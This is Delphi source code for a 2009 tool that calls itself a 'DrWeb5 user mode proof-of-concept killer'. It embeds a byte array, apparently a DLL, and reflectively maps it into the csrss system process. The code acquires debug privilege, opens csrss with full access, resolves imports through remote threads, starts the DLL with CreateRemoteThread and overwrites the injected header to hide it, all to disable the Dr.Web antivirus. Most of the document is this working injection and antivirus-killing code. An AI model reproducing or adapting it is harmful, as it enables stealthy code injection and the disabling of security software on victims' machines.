    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $44, $A1, $8D, $3B, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );
  IMPORTED_NAME_OFFSET = $00000002;
  IMAGE_ORDINAL_FLAG32 = $80000000;
  IMAGE_ORDINAL_MASK32 = $0000FFFF;

type
  TDllEntryProc = function(hinstDLL: HMODULE; dwReason: dword;
    lpvReserved: pointer): boolean; stdcall;

  TSections = array[0..0] of TImageSectionHeader;

  PLibInfo = ^TLibInfo;
  TLibInfo = packed record
    ImageBase: pointer;
    ImageSize: longint;
    DllProc: TDllEntryProc;
    DllProcAddress: pointer;
  end;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: dword;
    SizeOfBlock: dword;
  end;

  PImageImportDescriptor = ^TImageImportDescriptor;
  TImageImportDescriptor = packed record
    OriginalFirstThunk: dword;
    TimeDateStamp: dword;
    ForwarderChain: dword;
    Name: dword;
    FirstThunk: dword;
  end;

function GetSectionProtection(ImageScn: dword): dword;
begin
  Result := 0;
  if (ImageScn and IMAGE_SCN_MEM_NOT_CACHED) <> 0 then
    Result := Result or PAGE_NOCACHE;
  if (ImageScn and IMAGE_SCN_MEM_EXECUTE) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
    begin
      if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
        Result := Result or PAGE_EXECUTE_READWRITE
      else Result := Result or PAGE_EXECUTE_READ;

    end
    else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_EXECUTE_WRITECOPY
    else Result := Result or PAGE_EXECUTE;

  end
  else if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_READWRITE
    else Result := Result or PAGE_READONLY;

  end
  else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
    Result := Result or PAGE_WRITECOPY
  else Result := Result or PAGE_NOACCESS;
end;

function InjectMemory(Process: dword; Memory: pointer; Size: dword): pointer;
var
  BytesWritten: dword;
begin
  result := nil;
  ZwAllocateVirtualMemory(Process, @result, 0, @Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Memory, Size, @BytesWritten);
end;

function InjectThread(Process: dword; Thread: pointer; Info: pointer;
  InfoLen: dword; Results: boolean): THandle;
var
  pThread, pInfo: pointer;
  BytesRead, TID: dword;
begin
  pInfo := InjectMemory(Process, Info, InfoLen);
  pThread := InjectMemory(Process, Thread, SizeOfProc(Thread));
  Result := CreateRemoteThread(Process, nil, 0, pThread, pInfo, 0, TID);
  if Results then
  begin
    ZwWaitForSingleObject(Result, false, nil);
    ZwReadVirtualMemory(Process, pInfo, Info, InfoLen, @BytesRead);
  end;
end;

function InjectString(Process: dword; Text: PChar): PChar;
var
  BytesWritten: dword;
  Size: DWORD;
begin
  result := nil;
  Size := strlenA(Text) + 1;
  BytesWritten := Size;
  ZwAllocateVirtualMemory(Process, @result, 0, @BytesWritten, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Text, Size, @BytesWritten);
end;

function GetProcAddressEx(Process: dword; lpModuleName,
  lpProcName: pchar; dwProcLen: dword): pointer;
type
  TGetProcAddrExInfo = record
    pExitThread: pointer;
    pGetProcAddress: pointer;
    pGetModuleHandle: pointer;
    lpModuleName: pointer;
    lpProcName: pointer;
  end;
var
  GetProcAddrExInfo: TGetProcAddrExInfo;
  BasicInformation: THREAD_BASIC_INFORMATION;
  hThread: dword;

  procedure GetProcAddrExThread(lpParameter: pointer); stdcall;
  var
    GetProcAddrExInfo: TGetProcAddrExInfo;
  begin
    GetProcAddrExInfo := TGetProcAddrExInfo(lpParameter^);
    asm
      push GetProcAddrExInfo.lpModuleName
      call GetProcAddrExInfo.pGetModuleHandle
      push GetProcAddrExInfo.lpProcName
      push eax
      call GetProcAddrExInfo.pGetProcAddress
      push eax
      call GetProcAddrExInfo.pExitThread
    end;
  end;

begin
  Result := nil;
  GetProcAddrExInfo.pGetModuleHandle := GetProcAddress(GetModuleHandleW(kernel32), 'GetModuleHandleA');
  GetProcAddrExInfo.pGetProcAddress := GetProcAddress(GetModuleHandleW(kernel32), 'GetProcAddress');
  GetProcAddrExInfo.pExitThread := GetProcAddress(GetModuleHandleW(kernel32), 'ExitThread');
  if dwProcLen = 4 then GetProcAddrExInfo.lpProcName := lpProcName else
    GetProcAddrExInfo.lpProcName := InjectMemory(Process, lpProcName, dwProcLen);

  GetProcAddrExInfo.lpModuleName := InjectString(Process, lpModuleName);
  hThread := InjectThread(Process, @GetProcAddrExThread, @GetProcAddrExInfo,
    SizeOf(GetProcAddrExInfo), False);

  if hThread <> 0 then
  begin
    ZwWaitForSingleObject(hThread, false, nil);
    memzero(@BasicInformation, sizeof(BasicInformation));
    ZwQueryInformationThread(hThread, ThreadBasicInformation, @BasicInformation, sizeof(BasicInformation), nil);
    result := pointer(BasicInformation.ExitStatus);
  end;
end;

function MapLibrary(Process: dword; Dest, Src: pointer): TLibInfo;
var
  ImageBase: pointer;
  ImageBaseDelta: integer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  OldProtect: dword;
  bytesIO: DWORD;
  Addr: PChar;
  NewLibInfo: TLibInfo;

  procedure ProcessRelocs(PRelocs: PImageBaseRelocation);
  var
    PReloc: PImageBaseRelocation;
    RelocsSize: dword;
    Reloc: PWord;
    ModCount: dword;
    RelocLoop: dword;
  begin
    PReloc := PRelocs;
    RelocsSize := ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while dword(PReloc) - dword(PRelocs) < RelocsSize do
    begin
      ModCount := (PReloc.SizeOfBlock - Sizeof(PReloc^)) div 2;
      Reloc := pointer(dword(PReloc) + sizeof(PReloc^));
      for RelocLoop := 0 to ModCount - 1 do
      begin
        if Reloc^ and $F000 <> 0 then Inc(pdword(dword(ImageBase) +
            PReloc.VirtualAddress +
            (Reloc^ and $0FFF))^, ImageBaseDelta);
        Inc(Reloc);
      end;
      PReloc := pointer(Reloc);
    end;
  end;

  procedure ProcessImports(PImports: PImageImportDescriptor);
  var
    PImport: PImageImportDescriptor;
    Import: pdword;
    PImportedName: pchar;
    ProcAddress: pointer;
    PLibName: pchar;

    function IsImportByOrdinal(ImportDescriptor: dword): boolean;
    begin
      Result := (ImportDescriptor and IMAGE_ORDINAL_FLAG32) <> 0;
    end;

  begin
    PImport := PImports;
    while PImport.Name <> 0 do
    begin
      PLibName := pchar(dword(PImport.Name) + dword(ImageBase));

      if PImport.TimeDateStamp = 0 then
        Import := pdword(pImport.FirstThunk + dword(ImageBase))
      else
        Import := pdword(pImport.OriginalFirstThunk + dword(ImageBase));

      while Import^ <> 0 do
      begin
        if IsImportByOrdinal(Import^) then
          ProcAddress := GetProcAddressEx(Process, PLibName, PChar(Import^ and $FFFF), 4)
        else
        begin
          PImportedName := pchar(Import^ + dword(ImageBase) + IMPORTED_NAME_OFFSET);
          ProcAddress := GetProcAddressEx(Process, PLibName, PImportedName, strlenA(PImportedName));
        end;
        Ppointer(Import)^ := ProcAddress;
        Inc(Import);
      end;
      Inc(PImport);
    end;
  end;

begin
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
  ImageBase := Dest;
  ZwAllocateVirtualMemory(NtCurrentProcess, @ImageBase, 0, @bytesIO, MEM_RESERVE, PAGE_NOACCESS);

  ImageBaseDelta := dword(ImageBase) - ImageNtHeaders.OptionalHeader.ImageBase;

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  SectionBase := ImageBase;
  ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

  memcopy(SectionBase, Src, ImageNtHeaders.OptionalHeader.SizeOfHeaders);

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  ZwProtectVirtualMemory(NtCurrentProcess, @SectionBase, @bytesIO, PAGE_READONLY, @OldProtect);

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) +
    ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then
    begin
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
      RawSectionSize := VirtualSectionSize xor RawSectionSize;
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
    end;

    SectionBase := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    bytesIO := VirtualSectionSize;
    ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

    memzero(SectionBase, VirtualSectionSize);
    memcopy(SectionBase, (pchar(src) + PSections[SectionLoop].pointerToRawData), RawSectionSize);
  end;

  NewLibInfo.DllProcAddress := pointer(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint +
    dword(ImageBase));
  NewLibInfo.DllProc := TDllEntryProc(NewLibInfo.DllProcAddress);

  NewLibInfo.ImageBase := ImageBase;
  NewLibInfo.ImageSize := ImageNtHeaders.OptionalHeader.SizeOfImage;

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0
    then ProcessRelocs(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
      VirtualAddress + dword(ImageBase)));

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress <> 0
    then ProcessImports(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
      VirtualAddress + dword(ImageBase)));

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    bytesIO := PSections[SectionLoop].Misc.VirtualSize;
    Addr := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    ZwProtectVirtualMemory(NtCurrentProcess, @Addr,
      @bytesIO, GetSectionProtection(PSections[SectionLoop].Characteristics), @OldProtect);
  end;
  Result := NewLibInfo;
end;

function memopen(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, PAGE_EXECUTE_READWRITE, @OldProtect) = STATUS_SUCCESS);
end;

function memclose(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  pr, bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, OldProtect, @pr) = STATUS_SUCCESS);
end;

function InjectDllEx(Process: dword; Src: pointer): boolean;
type
  TDllLoadInfo = packed record
    Module: pointer;
    EntryPoint: pointer;
  end;
var
  Lib: TLibInfo;
  ImageNtHeaders: PImageNtHeaders;
  pModule: pointer;
  OldProtect: DWORD;
  BytesWritten: DWORD;
  Offset: DWORD;
  hThread: DWORD;
  bytesIO: DWORD;
  DllLoadInfo: TDllLoadInfo;

  procedure DllEntryPoint(lpParameter: pointer); stdcall;
  var
    LoadInfo: TDllLoadInfo;
  begin
    LoadInfo := TDllLoadInfo(lpParameter^);
    asm
      xor eax, eax
      push eax
      push DLL_PROCESS_ATTACH
      push LoadInfo.Module
      call LoadInfo.EntryPoint
    end;
  end;

begin
  Result := False;
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));
  Offset := $10000000;
  repeat
    Inc(Offset, $10000);

    pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
    bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
    ZwAllocateVirtualMemory(NtCurrentProcess, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pModule <> nil) then
    begin
      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pModule, @bytesIO, MEM_RELEASE);

      bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
      pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
      ZwAllocateVirtualMemory(Process, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    end;
  until ((pModule <> nil) or (Offset > $30000000));
  Lib := MapLibrary(Process, pModule, Src);
  if Lib.ImageBase = nil then Exit;
  DllLoadInfo.Module := Lib.ImageBase;
  DllLoadInfo.EntryPoint := Lib.DllProcAddress;

  ZwWriteVirtualMemory(Process, pModule, Lib.ImageBase, Lib.ImageSize, @BytesWritten);

  hThread := InjectThread(Process, @DllEntryPoint, @DllLoadInfo,
    SizeOf(TDllLoadInfo), False);
  Result := (hThread <> 0);
  OldProtect := 0;
  if (Result) then
    if (memopen(Process, pModule, OldProtect)) then
    begin
      bytesIO := 512;
      memfill(@tmp2, sizeof(tmp2), $F);
      ZwWriteVirtualMemory(Process, pModule, @tmp2, bytesIO, @BytesWritten);
      memclose(Process, pModule, OldProtect);
    end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, SpiDiE14, Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := 0;
  cid1.UniqueProcess := CsrGetProcessId();
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) <> STATUS_SUCCESS) then result := 0;
end;

const
  String1: PWideChar = 'This program requires Microsoft Windows XP :) <Nobody cares / Всем_похуй>';
  String2: PWideChar = '\BaseNamedObjects\DrWeb_Suxx';
  String3: PWideChar = 'You have already started this program once, please reboot';
  String4: PWideChar = 'DrWeb5 user mode proof-of-concept killer'#13#10 +
  'DKOH, fucking SSDT / Shadow SSDT will not help DrWeb!'#13#13#10 +
    '(c) 2009 by EP_X0FF'#13#13#10'Should we continue, my friend?'#13#13#10 +
    'NOTE:: '#13#10 +
    'If you choose Yes, then it will be required to reboot Windows before you'#13#10 +
    'can use antivirus again. Anything else on your system will not be affected.';

  String5: PWideChar = '\system32\dwunprot.dll';
  String6: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String7: PWideChar = 'Failed at injection stage';
  String8: PWideChar = 'That''s all folks! Awaiting further ridiculous protections ^_^';

var
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  MutexHandle: THANDLE;
  EventHandle: THANDLE;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    ShowMessage(String1, MB_ICONINFORMATION);
  end else
  begin
    if (ShowMessage(String4, MB_YESNO or MB_ICONQUESTION) = IDNO) then exit;

    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      strcpyW(tmp2, String2);
      RtlInitUnicodeString(@str1, tmp2);
      InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
      if (ZwCreateMutant(@MutexHandle, MUTANT_ALL_ACCESS, @attr, false) = STATUS_OBJECT_NAME_COLLISION) then
      begin
        ShowMessage(String3, MB_OK);
        ExitProcess($BADDEAD);
      end;

      hCsrss := GetTargetProcessHandle();
      if (hCsrss <> 0) then
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, String6);
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;
        if (EventHandle <> 0) then
        begin
          if not InjectDllEx(hCsrss, @data) then OutputDebugStringW(String7) else
          begin
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
              ShowMessage(String8, MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;

      end;
    end;
  end;
  ZwTerminateProcess(NtCurrentProcess, 0);
end.

